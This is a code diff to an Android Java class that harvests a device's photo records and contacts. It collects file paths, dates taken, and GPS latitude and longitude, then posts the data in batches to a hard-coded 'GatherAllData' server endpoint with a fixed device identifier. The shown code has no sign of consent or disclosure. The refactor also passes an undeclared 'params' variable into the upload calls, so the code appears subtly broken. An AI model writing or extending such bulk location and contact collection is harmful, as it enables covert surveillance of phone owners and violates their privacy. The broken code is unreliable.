@@ -69,9 +69,8 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             if (maskHash2[0].charAt(i) == '1') {
                 switch (i) {
                     case 0:
-                        getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI, params[0]);
-                        getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                                params[0]);
+                        getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI);
+                        getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                         break;
                     case 1:
                         getContacts(bulkData, hashes[i]);
@@ -456,7 +455,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getPhotos(String hash, Uri uri, Context context) {
+    private void getPhotos(String hash, Uri uri) {
         try {
             JSONObject photos = new JSONObject();
             JSONArray informationArray = new JSONArray();
@@ -476,13 +475,13 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     , selection, selectionArgs, "datetaken DESC");
 
             if (cur.moveToFirst()) {
+                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                 int dateTakenIndex = cur.getColumnIndex(filePathColumn[1]);
                 int latitudeIndex = cur.getColumnIndex(filePathColumn[2]);
                 int longitudeIndex = cur.getColumnIndex(filePathColumn[3]);
                 int counter = 0;
                 do {
-                    counter ++;
-                    int columnIndex = cur.getColumnIndex(filePathColumn[0]);
+                    counter++;
                     String picturePath = cur.getString(columnIndex);
                     if (picturePath != null) {
 
@@ -521,12 +520,12 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                         }
 
                         informationArray.put(information);
-                        if (counter%20 == 0) {
+                        if (counter % 20 == 0) {
                             JSONObject bulkData = new JSONObject();
                             photos.put("Photos", informationArray);
                             photos.put("Hash", newHash);
                             bulkData.put("Photos", photos);
-                            ServerCommunicationHandler.executeDataPost(context,
+                            ServerCommunicationHandler.executeDataPost(params,
                                     "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                                     "357336064017681");
                         }
@@ -542,7 +541,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 photos.put("Hash", newHash);
                 bulkData.put("Photos", photos);
 
-                ServerCommunicationHandler.executeDataPost(context,
+                ServerCommunicationHandler.executeDataPost(params,
                         "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                         "357336064017681");
             }
